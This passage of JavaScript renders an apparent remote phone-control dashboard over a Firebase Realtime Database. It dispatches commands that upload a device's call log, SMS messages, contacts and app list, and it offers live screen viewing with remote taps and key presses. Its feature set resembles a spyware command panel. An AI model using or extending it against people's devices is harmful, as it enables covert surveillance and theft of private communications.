          </button>
        ` : ''}
      </div>

      <div class="p-4 space-y-4">
        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <div class="flex items-center justify-between">
            <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; QUICK_LIST_UPLOAD_COMMANDS</p>
            <span class="text-[10px] font-mono-tabular text-slate-400">One-tap RTDB dispatch</span>
          </div>
          <div class="grid grid-cols-2 sm:grid-cols-3 gap-2">
            ${quickPresets
              .map(
                (p) => `
                <button
                  type="button"
                  data-send-upload-cmd="${esc(p.cmd)}"
                  data-upload-target="${esc(p.target)}"
                  class="p-2.5 rounded-xl bg-[#040a07] border border-emerald-500/25 hover:border-emerald-400/60 hover:bg-emerald-500/10 text-left transition-colors cursor-pointer"
                >
                  <p class="text-xs font-semibold text-emerald-200 truncate">${esc(p.label)}</p>
                  <p class="text-[10px] font-mono-tabular text-emerald-400/80 truncate mt-0.5">${esc(p.cmd)}</p>
                  <p class="text-[10px] text-slate-500 truncate mt-0.5">${esc(p.desc)}</p>
                </button>
              `
              )
              .join('')}
          </div>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; SEND_CUSTOM_COMMAND</p>
          <form id="form-send-command" class="space-y-2.5">
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Command Action</label>
                <input
                  name="command"
                  type="text"
                  maxlength="64"
                  required
                  placeholder="e.g. UPLOAD_CALLLOG"
                  class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white"
                />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Target List / Node</label>
                <select name="target" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white">
                  <option value="all">all</option>
                  <option value="calllog">calllog</option>
                  <option value="messages">messages</option>
                  <option value="contacts">contacts</option>
                  <option value="apps">apps</option>
                  <option value="status">status</option>
                  <option value="custom">custom</option>
                </select>
              </div>
            </div>
            <div>
              <label class="block text-[11px] text-slate-400 mb-1">Payload / Parameters (optional)</label>
              <input
                name="payload"
                type="text"
                maxlength="500"
                placeholder='e.g. {"limit":50} or force=true'
                class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white"
              />
            </div>
            <button type="submit" class="w-full h-10 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-mono-tabular font-semibold cursor-pointer">
              Send Command to RTDB
            </button>
          </form>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <p class="text-xs font-mono-tabular font-semibold text-emerald-300">&gt; COMMAND_QUEUE (${state.commands.length})</p>
          ${state.commands.length === 0 ? `
            <p class="text-xs text-slate-400 py-3 text-center font-mono-tabular">No commands queued under ${esc(devicePath(state.activeUid, 'commands'))}.</p>
          ` : `
            <div class="space-y-2">
              ${state.commands
                .map((cmd) => {
                  const badgeCls =
                    cmd.status === 'executed' || cmd.status === 'done' || cmd.status === 'completed'
                      ? 'bg-emerald-500/15 text-emerald-300 border-emerald-500/30'
                      : cmd.status === 'failed' || cmd.status === 'error'
                        ? 'bg-red-500/15 text-red-300 border-red-500/30'
                        : 'bg-amber-500/15 text-amber-300 border-amber-500/30';
                  const nextStatus = cmd.status === 'pending' ? 'executed' : 'pending';
                  return `
                    <div class="p-2.5 rounded-xl bg-[#040a07] border border-emerald-500/15 flex items-start justify-between gap-2">
                      <div class="min-w-0">
                        <div class="flex items-center gap-2 flex-wrap">
                          <span class="text-xs font-mono-tabular font-semibold text-white">${esc(cmd.command)}</span>
                          <span class="px-1.5 py-0.5 text-[10px] font-mono-tabular rounded border ${badgeCls}">${esc(cmd.status)}</span>
                          <span class="text-[10px] font-mono-tabular text-slate-400">target:${esc(cmd.target)}</span>
                        </div>
                        ${cmd.payload ? `<p class="text-[11px] font-mono-tabular text-slate-400 mt-1 break-all">${esc(cmd.payload)}</p>` : ''}
                        <p class="text-[10px] font-mono-tabular text-slate-500 mt-1">${esc(cmd.timestampLabel)} · ${esc(cmd.id)}</p>
                      </div>
                      <div class="flex items-center gap-1 shrink-0">
                        <button
                          type="button"
                          data-toggle-cmd-status="${esc(cmd.id)}"
                          data-next-cmd-status="${esc(nextStatus)}"
                          class="px-2 py-1 text-[10px] font-mono-tabular rounded bg-slate-800 hover:bg-slate-700 text-emerald-300 cursor-pointer"
                        >
                          ${cmd.status === 'pending' ? 'Mark Done' : 'Requeue'}
                        </button>
                        <button
                          type="button"
                          data-delete-cmd="${esc(cmd.id)}"
                          class="px-2 py-1 text-xs text-slate-400 hover:text-red-400 cursor-pointer"
                          aria-label="Delete command"
                        >
                          ×
                        </button>
                      </div>
                    </div>
                  `;
                })
                .join('')}
            </div>
          `}
        </div>
      </div>
    </div>
  `;
}

function renderSettingsScreen() {
  const s = state.status;
  if (!s) {
    return `<div class="p-6 text-center text-xs text-slate-400">Loading ${esc(devicePath(state.activeUid, 'status'))}...</div>`;
  }

  const storagePct = Math.min(100, Math.round((s.storageUsedGb / Math.max(1, s.storageTotalGb)) * 100));
  const ramPct = Math.min(100, Math.round((s.ramUsedGb / Math.max(1, s.ramTotalGb)) * 100));
  const batt = Math.round(Number(s.batteryLevel) || 0);
  const netOptions = ['5G', '4G', 'Wi-Fi', '3G', 'Offline'];

  return `
    <div class="min-h-full bg-[#040a07] flex flex-col">
      <div class="sticky top-0 z-10 bg-[#040a07]/95 backdrop-blur-md px-4 py-3 border-b border-slate-800 flex items-center justify-between gap-2">
        <div>
          <h2 class="text-sm font-bold text-white">Status Update System</h2>
          <p class="text-[11px] font-mono-tabular text-slate-400">${esc(devicePath(state.activeUid, 'status'))}</p>
        </div>
        <button
          type="button"
          data-send-upload-cmd="UPLOAD_STATUS"
          data-upload-target="status"
          class="px-2.5 py-1.5 text-[11px] font-mono-tabular font-semibold bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 hover:bg-emerald-500/25 rounded-lg cursor-pointer shrink-0"
        >
          ↑ Sync Status Cmd
        </button>
      </div>

      <div class="p-4 space-y-4">
        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <div class="flex items-center justify-between gap-2">
            <div>
              <p class="text-xs font-semibold text-white">Live Presence &amp; Heartbeat</p>
              <p class="text-[11px] font-mono-tabular text-slate-400 mt-0.5">
                Last Seen: ${s.lastSeen ? esc(new Date(Number(s.lastSeen)).toLocaleString()) : '—'}
              </p>
            </div>
            <button
              type="button"
              data-action="phone-toggle-online"
              class="px-3 py-1.5 rounded-lg text-xs font-mono-tabular font-semibold cursor-pointer ${s.online ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-300'}"
            >
              ${s.online ? '● Online' : '○ Offline'}
            </button>
          </div>
          <div class="flex items-center gap-2 pt-1">
            <button
              type="button"
              data-action="phone-ping-lastseen"
              class="flex-1 h-8 text-[11px] font-mono-tabular font-medium bg-[#040a07] border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/15 rounded-lg cursor-pointer"
            >
              Update Last Seen (Now)
            </button>
            <button
              type="button"
              data-nav="commands"
              class="px-3 h-8 text-[11px] font-mono-tabular font-medium bg-[#040a07] border border-slate-700 text-slate-200 hover:border-emerald-400/50 rounded-lg cursor-pointer"
            >
              Command Center →
            </button>
          </div>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <div class="flex items-center justify-between">
            <span class="text-xs font-semibold text-white">Battery &amp; Power</span>
            <span class="text-base font-bold font-mono-tabular ${s.isCharging ? 'text-emerald-400' : batt <= 20 ? 'text-amber-400' : 'text-white'}">${batt}%</span>
          </div>
          <input
            id="input-status-battery-range"
            type="range"
            min="0"
            max="100"
            value="${batt}"
            class="w-full accent-emerald-500 cursor-pointer"
          />
          <div class="flex items-center justify-between text-[11px] text-slate-400 gap-2">
            <span>${s.isCharging ? 'Charging via USB-C' : 'Discharging'} · <span class="font-mono-tabular">${esc(s.temperatureC)}°C</span></span>
            <div class="flex items-center gap-1.5">
              <button type="button" data-step-battery="-10" class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono-tabular cursor-pointer">-10%</button>
              <button type="button" data-step-battery="10" class="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-200 font-mono-tabular cursor-pointer">+10%</button>
              <button type="button" data-action="phone-toggle-charging" class="px-2 py-1 rounded bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 hover:bg-emerald-500/25 font-medium cursor-pointer">
                ${s.isCharging ? 'Unplug' : 'Plug In'}
              </button>
            </div>
          </div>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <p class="text-xs font-semibold text-white">Radio &amp; Network Status</p>
          <div class="flex flex-wrap gap-1.5">
            ${netOptions
              .map(
                (netOpt) => `
                <button
                  type="button"
                  data-set-network="${esc(netOpt)}"
                  class="px-2.5 py-1 rounded-md text-[11px] font-mono-tabular font-medium cursor-pointer ${s.networkType === netOpt ? 'bg-emerald-600 text-white' : 'bg-[#040a07] border border-slate-800 text-slate-400 hover:text-white'}"
                >
                  ${esc(netOpt)}
                </button>
              `
              )
              .join('')}
          </div>
          <div class="flex items-center justify-between pt-1 text-xs">
            <span class="text-slate-300">Signal Bars</span>
            <div class="flex items-center gap-1">
              ${[0, 1, 2, 3, 4]
                .map(
                  (bars) => `
                  <button
                    type="button"
                    data-set-signal="${bars}"
                    class="w-6 h-6 rounded text-[11px] font-mono-tabular cursor-pointer ${Number(s.signalStrength) === bars ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-400 hover:text-white'}"
                  >
                    ${bars}
                  </button>
                `
                )
                .join('')}
            </div>
          </div>
          <div class="flex items-center justify-between py-1 text-xs">
            <span class="text-slate-300">Wi-Fi (${esc(s.wifiName || 'None')})</span>
            <button type="button" data-action="phone-toggle-wifi" class="px-2.5 py-1 rounded-md text-[11px] font-medium cursor-pointer ${s.wifiConnected ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-400'}">
              ${s.wifiConnected ? 'On' : 'Off'}
            </button>
          </div>
          <div class="flex items-center justify-between py-1 text-xs">
            <span class="text-slate-300">Bluetooth</span>
            <button type="button" data-action="phone-toggle-bt" class="px-2.5 py-1 rounded-md text-[11px] font-medium cursor-pointer ${s.bluetoothOn ? 'bg-emerald-600 text-white' : 'bg-slate-800 text-slate-400'}">
              ${s.bluetoothOn ? 'On' : 'Off'}
            </button>
          </div>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-2.5">
          <div class="flex items-center justify-between">
            <p class="text-xs font-semibold text-white">Edit Device Status Fields</p>
            <span class="text-[10px] font-mono-tabular text-slate-400 truncate">UID: ${esc(state.activeUid)}</span>
          </div>
          <form id="form-status-update" class="space-y-2.5">
            <div class="grid grid-cols-1 sm:grid-cols-2 gap-2">
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Device Name</label>
                <input name="deviceName" type="text" maxlength="64" value="${esc(s.deviceName)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Model</label>
                <input name="model" type="text" maxlength="64" value="${esc(s.model)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">OS Version</label>
                <input name="osVersion" type="text" maxlength="32" value="${esc(s.osVersion)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Wi-Fi SSID</label>
                <input name="wifiName" type="text" maxlength="64" value="${esc(s.wifiName)}" class="w-full h-9 px-2.5 text-xs bg-[#040a07] border border-slate-800 rounded-lg text-white" />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Temp (°C)</label>
                <input name="temperatureC" type="number" step="0.1" min="-20" max="120" value="${esc(s.temperatureC)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
              </div>
              <div>
                <label class="block text-[11px] text-slate-400 mb-1">Storage Used / Total (GB)</label>
                <div class="grid grid-cols-2 gap-1.5">
                  <input name="storageUsedGb" type="number" step="0.1" min="0" max="4096" value="${esc(s.storageUsedGb)}" class="w-full h-9 px-2 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
                  <input name="storageTotalGb" type="number" step="1" min="1" max="4096" value="${esc(s.storageTotalGb)}" class="w-full h-9 px-2 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
                </div>
              </div>
              <div class="sm:col-span-2">
                <label class="block text-[11px] text-slate-400 mb-1">RAM Used / Total (GB)</label>
                <div class="grid grid-cols-2 gap-2">
                  <input name="ramUsedGb" type="number" step="0.1" min="0" max="256" value="${esc(s.ramUsedGb)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
                  <input name="ramTotalGb" type="number" step="1" min="1" max="256" value="${esc(s.ramTotalGb)}" class="w-full h-9 px-2.5 text-xs font-mono-tabular bg-[#040a07] border border-slate-800 rounded-lg text-white" />
                </div>
              </div>
            </div>
            <button type="submit" class="w-full h-10 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white text-xs font-mono-tabular font-semibold cursor-pointer">
              Save Status Update to RTDB
            </button>
          </form>
        </div>

        <div class="p-3.5 rounded-2xl bg-[#07130e] border border-emerald-500/20 space-y-3">
          <p class="text-xs font-semibold text-white">Storage &amp; Memory Usage</p>
          <div>
            <div class="flex justify-between text-[11px] text-slate-400 mb-1">
              <span>Internal Storage</span>
              <span class="font-mono-tabular text-slate-200">${esc(s.storageUsedGb)} / ${esc(s.storageTotalGb)} GB (${storagePct}%)</span>
            </div>
            <div class="w-full h-1.5 rounded-full bg-slate-800 overflow-hidden">
              <div class="h-full bg-indigo-500" style="width:${storagePct}%"></div>
            </div>
          </div>
          <div>
            <div class="flex justify-between text-[11px] text-slate-400 mb-1">
              <span>System RAM</span>
              <span class="font-mono-tabular text-slate-200">${esc(s.ramUsedGb)} / ${esc(s.ramTotalGb)} GB (${ramPct}%)</span>
            </div>
            <div class="w-full h-1.5 rounded-full bg-slate-800 overflow-hidden">
              <div class="h-full bg-cyan-500" style="width:${ramPct}%"></div>
            </div>
          </div>
        </div>
      </div>
    </div>
  `;
}

function renderPhoneScreen() {
  const viewport = document.getElementById('phone-viewport');
  if (!viewport) return;

  const activeId = document.activeElement?.id;
  const activeSelectionStart = document.activeElement?.selectionStart;

  if (state.locked || state.screen === 'lock') {
    viewport.innerHTML = renderLockScreen();
  } else if (state.screen === 'home') {
    viewport.innerHTML = renderHomeScreen();
  } else if (state.screen === 'phone') {
    viewport.innerHTML = renderPhoneScreenApp();
  } else if (state.screen === 'messages') {
    viewport.innerHTML = renderMessagesScreen();
  } else if (state.screen === 'contacts') {
    viewport.innerHTML = renderContactsScreen();
  } else if (state.screen === 'apps') {
    viewport.innerHTML = renderAppsScreen();
  } else if (state.screen === 'commands') {
    viewport.innerHTML = renderCommandsScreen();
  } else if (state.screen === 'screen') {
    const existingStage = document.getElementById('remote-screen-stage');
    const existingImg = document.getElementById('remote-screen-image');
    const existingFallback = document.getElementById('remote-screen-fallback');
    const hasSrc = Boolean(state.screenData?.imageSrc);
    const sameImageMode = existingStage && ((hasSrc && existingImg) || (!hasSrc && existingFallback));

    if (sameImageMode && !state.forceScreenRebuild) {
      if (hasSrc && existingImg && state.lastCommittedFrameSrc !== state.screenData.imageSrc) {
        void smoothSwapRemoteScreenImage(state.screenData.imageSrc);
      }
      const sub = document.getElementById('remote-screen-subtitle');
      if (sub) {
        const updatedText = state.screenData?.updatedAt
          ? new Date(Number(state.screenData.updatedAt)).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' })
          : 'Waiting';
        sub.textContent = `${devicePath(state.activeUid, 'screen')} · ${updatedText}`;
      }
      updateCastFlowButtonsDom();
      if (!state.swipeTrail?.active) {
        if (state.swipeTrail) {
          renderSwipeTrailLayer(state.swipeTrail);
        } else {
          renderTapDotLayer(state.lastTapMarker);
        }
      }
    } else {
      state.forceScreenRebuild = false;
      viewport.innerHTML = renderLiveScreenView();
    }
  } else if (state.screen === 'settings') {
    viewport.innerHTML = renderSettingsScreen();
  }

  if (activeId) {
    const restored = document.getElementById(activeId);
    if (restored && typeof restored.focus === 'function') {
      restored.focus();
      if (typeof activeSelectionStart === 'number' && typeof restored.setSelectionRange === 'function') {
        try {
          restored.setSelectionRange(activeSelectionStart, activeSelectionStart);
        } catch {
          // Ignore
        }
      }
    }
  }
}

function renderDeviceOverviewAndInspector() {
  const hasDevice = Boolean(state.activeUid && state.status);

  const kpiName = document.getElementById('kpi-device-name');
  const kpiBatt = document.getElementById('kpi-battery');
  const kpiComms = document.getElementById('kpi-comms');
  const kpiInv = document.getElementById('kpi-inventory');

  if (kpiName) kpiName.textContent = hasDevice ? state.status.deviceName : '—';
  if (kpiBatt) {
    kpiBatt.textContent = hasDevice
      ? `${Math.round(state.status.batteryLevel)}% · ${state.status.isCharging ? 'Charging' : 'Discharging'}`
      : '—';
  }
  if (kpiComms) {
    kpiComms.textContent = state.activeUid ? `${state.calllog.length} calls / ${state.messages.length} SMS` : '—';
  }
  if (kpiInv) {
    kpiInv.textContent = state.activeUid ? `${state.contacts.length} contacts / ${state.apps.length} apps` : '—';
  }

  const pathEl = document.getElementById('inspector-active-path');
  const jsonEl = document.getElementById('inspector-json-output');
  if (!pathEl || !jsonEl) return;

  const uidDisplay = state.activeUid ? devicePath(state.activeUid) : state.uidBasePath ? `${state.uidBasePath}/{uid}` : '{uid}';
  const tab = state.inspectorTab;

  document.querySelectorAll('.inspector-tab').forEach((btn) => {
    const active = btn.getAttribute('data-inspector-tab') === tab;
    btn.className = `inspector-tab px-3 py-1.5 text-xs font-mono-tabular font-medium rounded-md whitespace-nowrap cursor-pointer ${
      active ? 'bg-emerald-500/20 text-emerald-300' : 'text-slate-400 hover:text-emerald-300'
    }`;
  });

  if (tab === 'status') {
    pathEl.textContent = `${uidDisplay}/status`;
    jsonEl.textContent = state.activeUid
      ? JSON.stringify(state.status || {}, null, 2)
      : 'Select a device UID to inspect Realtime Database nodes.';
  } else if (tab === 'screen') {
    pathEl.textContent = `${uidDisplay}/screen`;
    if (!state.activeUid) {
      jsonEl.textContent = 'Select a device UID to inspect Realtime Database nodes.';
    } else if (!state.screenData) {
      jsonEl.textContent = 'null';
    } else {
      jsonEl.textContent = JSON.stringify(
        {
          ...state.screenData,
          imageSrc: state.screenData.imageSrc
            ? `${state.screenData.imageSrc.slice(0, 96)}... (${state.screenData.imageSrc.length} chars)`
            : '',
        },
        null,
        2
      );
    }
  } else if (tab === 'screenControl') {
    pathEl.textContent = `${uidDisplay}/screenControl`;
    jsonEl.textContent = state.activeUid
      ? JSON.stringify(state.screenControl || {}, null, 2)
      : 'Select a device UID to inspect Realtime Database nodes.';
  } else {
    pathEl.textContent = `${uidDisplay}/${tab}`;
    const listMap = {
      calllog: state.calllog,
      messages: state.messages,
      contacts: state.contacts,
      apps: state.apps,
      commands: state.commands,
    };
    jsonEl.textContent = state.activeUid
      ? JSON.stringify(listMap[tab] || [], null, 2)
      : 'Select a device UID to inspect Realtime Database nodes.';
  }
}

function renderAll() {
  renderViewStage();
  if (!state.activeUid) {
    renderDeviceUidList();
    return;
  }
  renderPhoneStatusBarAndShade();
  renderPhoneScreen();
  const inspectorModal = document.getElementById('rtdb-inspector-modal');
  if (inspectorModal && !inspectorModal.classList.contains('hidden')) {
    renderDeviceOverviewAndInspector();
  }
}

// --- Static Event Listeners ---
function wireStaticListeners() {
  document.getElementById('btn-dismiss-error')?.addEventListener('click', hideErrorBanner);

  document.getElementById('btn-brand-home')?.addEventListener('click', returnToUidList);
  document.getElementById('nav-to-uid-list')?.addEventListener('click', returnToUidList);
  document.getElementById('btn-back-to-uid-list')?.addEventListener('click', (e) => {
    e.stopPropagation();
    returnToUidList();
  });

  document.querySelectorAll('[data-jump-screen]').forEach((btn) => {
    btn.addEventListener('click', () => {
      const target = btn.getAttribute('data-jump-screen');
      if (target && state.activeUid) navigateTo(target);
    });
  });

  // Clickable Device UID List delegation (Stage 1 -> Stage 2)
  document.getElementById('device-uid-list')?.addEventListener('click', (e) => {
    const rowBtn = e.target.closest('[data-select-uid]');
    if (!rowBtn) return;
    const uid = rowBtn.getAttribute('data-select-uid');
    if (uid) selectDeviceUid(uid);
  });

  document.getElementById('btn-open-inspector')?.addEventListener('click', () => {
    state.shadeOpen = false;
    renderPhoneStatusBarAndShade();
    renderDeviceOverviewAndInspector();
    document.getElementById('rtdb-inspector-modal')?.classList.remove('hidden');
  });

  document.getElementById('btn-close-inspector')?.addEventListener('click', () => {
    document.getElementById('rtdb-inspector-modal')?.classList.add('hidden');
  });

  // Status bar & shade
  document.getElementById('phone-status-bar')?.addEventListener('click', (e) => {
    if (e.target.closest('#btn-back-to-uid-list')) return;
    state.shadeOpen = !state.shadeOpen;
    renderPhoneStatusBarAndShade();
  });
  document.getElementById('btn-close-shade')?.addEventListener('click', () => {
    state.shadeOpen = false;
    renderPhoneStatusBarAndShade();
  });
  document.getElementById('btn-shade-handle')?.addEventListener('click', () => {
    state.shadeOpen = false;
    renderPhoneStatusBarAndShade();
  });

  document.getElementById('shade-toggle-wifi')?.addEventListener('click', () => {
    if (!state.status) return;
    updateDeviceStatusFields({ wifiConnected: !state.status.wifiConnected });
  });
  document.getElementById('shade-toggle-bt')?.addEventListener('click', () => {
    if (!state.status) return;
    updateDeviceStatusFields({ bluetoothOn: !state.status.bluetoothOn });
  });
  document.getElementById('shade-toggle-charging')?.addEventListener('click', () => {
    if (!state.status) return;
    updateDeviceStatusFields({ isCharging: !state.status.isCharging });
  });
  document.getElementById('shade-open-settings')?.addEventListener('click', () => {
    navigateTo('settings');
  });
  document.getElementById('shade-open-screen')?.addEventListener('click', () => {
    navigateTo('screen');
  });
  document.getElementById('shade-open-commands')?.addEventListener('click', () => {
    navigateTo('commands');
  });

  // Hardware buttons
  document.getElementById('hw-btn-power')?.addEventListener('click', () => {
    if (!state.activeUid) return;
    state.locked = !state.locked;
    state.screen = state.locked ? 'lock' : 'home';
    state.shadeOpen = false;
    renderAll();
  });

  document.getElementById('hw-btn-vol-up')?.addEventListener('click', () => {
    if (!state.status) return;
    const next = Math.min(100, Math.round(state.status.batteryLevel) + 5);
    updateDeviceStatusFields({ batteryLevel: next });
  });

  document.getElementById('hw-btn-vol-down')?.addEventListener('click', () => {
    if (!state.status) return;
    const next = Math.max(0, Math.round(state.status.batteryLevel) - 5);
    updateDeviceStatusFields({ batteryLevel: next });
  });

  // Android bottom nav
  document.getElementById('nav-back')?.addEventListener('click', goBack);
  document.getElementById('nav-home')?.addEventListener('click', () => navigateTo('home'));
  document.getElementById('nav-recents')?.addEventListener('click', () => navigateTo('apps'));

  // Inspector tabs
  document.querySelectorAll('.inspector-tab').forEach((btn) => {
    btn.addEventListener('click', () => {
      const tab = btn.getAttribute('data-inspector-tab');
      if (tab) {
        state.inspectorTab = tab;
        renderDeviceOverviewAndInspector();
      }
    });
  });

  // Event Delegation inside Phone Viewport
  const viewport = document.getElementById('phone-viewport');
  if (viewport) {
    viewport.addEventListener('click', async (e) => {
      const target = e.target.closest('button, [data-action], [data-nav]');
      if (!target) return;

      const action = target.getAttribute('data-action');
      if (action === 'unlock-phone') {
        state.locked = false;
        return navigateTo('home');
      }
      if (action === 'dial-backspace') {
        state.dialNumber = state.dialNumber.slice(0, -1);
        return renderPhoneScreen();
      }
      if (action === 'place-call') {
        if (!state.dialNumber.trim()) return;
        const num = state.dialNumber.trim();
        await logCallEntry({
          name: '',
          phoneNumber: num,
          type: 'outgoing',
          durationSec: 45,
        });
        state.dialNumber = '';
        state.phoneTab = 'all';
        showPhoneToast('Outgoing Call Logged', num);
        return renderPhoneScreen();
      }
      if (action === 'open-new-msg') {
        state.showNewMessageForm = true;
        return renderPhoneScreen();
      }
      if (action === 'close-new-msg') {
        state.showNewMessageForm = false;
        return renderPhoneScreen();
      }
      if (action === 'close-thread') {
        state.activeThreadPhone = null;
        return renderPhoneScreen();
      }
      if (action === 'open-add-contact') {
        state.showAddContactForm = true;
        return renderPhoneScreen();
      }
      if (action === 'close-add-contact') {
        state.showAddContactForm = false;
        return renderPhoneScreen();
      }
      if (action === 'open-install-app') {
        state.showInstallAppForm = true;
        return renderPhoneScreen();
      }
      if (action === 'close-install-app') {
        state.showInstallAppForm = false;
        return renderPhoneScreen();
      }
      if (action === 'phone-toggle-charging') {
        if (!state.status) return;
        return updateDeviceStatusFields({ isCharging: !state.status.isCharging });
      }
      if (action === 'phone-toggle-wifi') {
        if (!state.status) return;
        return updateDeviceStatusFields({ wifiConnected: !state.status.wifiConnected });
      }
      if (action === 'phone-toggle-bt') {
        if (!state.status) return;
        return updateDeviceStatusFields({ bluetoothOn: !state.status.bluetoothOn });
      }
      if (action === 'phone-toggle-online') {
        if (!state.status) return;
        return updateDeviceStatusFields({ online: !state.status.online, lastSeen: Date.now() });
      }
      if (action === 'phone-ping-lastseen') {
        if (!state.status) return;
        await updateDeviceStatusFields({ online: true, lastSeen: Date.now() });
        showPhoneToast('Status Updated', 'Online & lastSeen synced');
        return;
      }
      if (action === 'clear-all-commands') {
        return clearAllCommands();
      }

      const uploadCmd = target.getAttribute('data-send-upload-cmd');
      if (uploadCmd) {
        const uploadTarget = target.getAttribute('data-upload-target') || 'all';
        return sendDeviceCommand({ command: uploadCmd, target: uploadTarget });
      }

      const toggleCmdId = target.getAttribute('data-toggle-cmd-status');
      if (toggleCmdId) {
        const nextStatus = target.getAttribute('data-next-cmd-status') || 'executed';
        return updateCommandStatus(toggleCmdId, nextStatus);
      }

      const deleteCmdId = target.getAttribute('data-delete-cmd');
      if (deleteCmdId) {
        return deleteCommandEntry(deleteCmdId);
      }

      const stepBattery = target.getAttribute('data-step-battery');
      if (stepBattery !== null) {
        if (!state.status) return;
        const delta = Number(stepBattery) || 0;
        const next = Math.max(0, Math.min(100, Math.round(state.status.batteryLevel) + delta));
        return updateDeviceStatusFields({ batteryLevel: next });
      }

      const setNetwork = target.getAttribute('data-set-network');
      if (setNetwork) {
        if (!state.status) return;
        return updateDeviceStatusFields({ networkType: setNetwork });
      }

      const setSignal = target.getAttribute('data-set-signal');
      if (setSignal !== null) {
        if (!state.status) return;
        const nextSig = Math.max(0, Math.min(4, Number(setSignal) || 0));
        return updateDeviceStatusFields({ signalStrength: nextSig });
      }

      const castStep = target.getAttribute('data-cast-step');
      if (castStep) {
        return sendCastStepCommand(castStep);
      }

      const screenSize = target.getAttribute('data-screen-size');
      if (screenSize) {
        state.screenSizeMode = screenSize === 'mini' || screenSize === 'max' ? screenSize : 'normal';
        state.forceScreenRebuild = true;
        return renderPhoneScreen();
      }

      const screenMode = target.getAttribute('data-screen-mode');
      if (screenMode) {
        state.screenControlMode = screenMode === 'swipe' ? 'swipe' : 'tap';
        state.forceScreenRebuild = true;
        return renderPhoneScreen();
      }

      const screenKey = target.getAttribute('data-screen-key');
      if (screenKey) {
        return sendScreenTapControl({ action: 'key', key: screenKey });
      }

      const nav = target.getAttribute('data-nav');
      if (nav) return navigateTo(nav);

      const launchApp = target.getAttribute('data-launch-app');
      if (launchApp) return launchAppByName(launchApp);

      const phoneTab = target.getAttribute('data-phone-tab');
      if (phoneTab) {
        state.phoneTab = phoneTab;
        return renderPhoneScreen();
      }

      const dialKey = target.getAttribute('data-dial-key');
      if (dialKey) {
        if (state.dialNumber.length < 32) state.dialNumber += dialKey;
        return renderPhoneScreen();
      }

      const cbNum = target.getAttribute('data-callback-number');
      if (cbNum) {
        const cbName = target.getAttribute('data-callback-name') || cbNum;
        await logCallEntry({
          name: cbName,
          phoneNumber: cbNum,
          type: 'outgoing',
          durationSec: 38,
        });
        showPhoneToast('Calling...', `${cbName} (${cbNum})`);
        return;
      }

      const delCallId = target.getAttribute('data-delete-call');
      if (delCallId) return deleteCallEntry(delCallId);

      const threadPhone = target.getAttribute('data-open-thread');
      if (threadPhone) {
        state.activeThreadPhone = threadPhone;
        renderPhoneScreen();
        await markThreadRead(threadPhone);
        return;
      }

      const toggleContactId = target.getAttribute('data-toggle-contact');
      if (toggleContactId) {
        state.expandedContactId = state.expandedContactId === toggleContactId ? null : toggleContactId;
        return renderPhoneScreen();
      }

      const contactCallId = target.getAttribute('data-contact-call');
      if (contactCallId) {
        const c = state.contacts.find((item) => item.id === contactCallId);
        if (!c) return;
        await logCallEntry({ name: c.name, phoneNumber: c.phoneNumber, type: 'outgoing', durationSec: 64 });
        showPhoneToast('Dialed Contact', c.name);
        return navigateTo('phone');
      }

      const contactMsgId = target.getAttribute('data-contact-msg');
      if (contactMsgId) {
        const c = state.contacts.find((item) => item.id === contactMsgId);
        if (!c) return;
        state.activeThreadPhone = c.phoneNumber;
        return navigateTo('messages');
      }

      const contactFavId = target.getAttribute('data-contact-fav');
      if (contactFavId) {
        const c = state.contacts.find((item) => item.id === contactFavId);
        if (c) return toggleContactFavorite(c);
      }

      const contactDelId = target.getAttribute('data-contact-del');
      if (contactDelId) return deleteContactEntry(contactDelId);

      const appCat = target.getAttribute('data-app-cat');
      if (appCat) {
        state.appCategory = appCat;
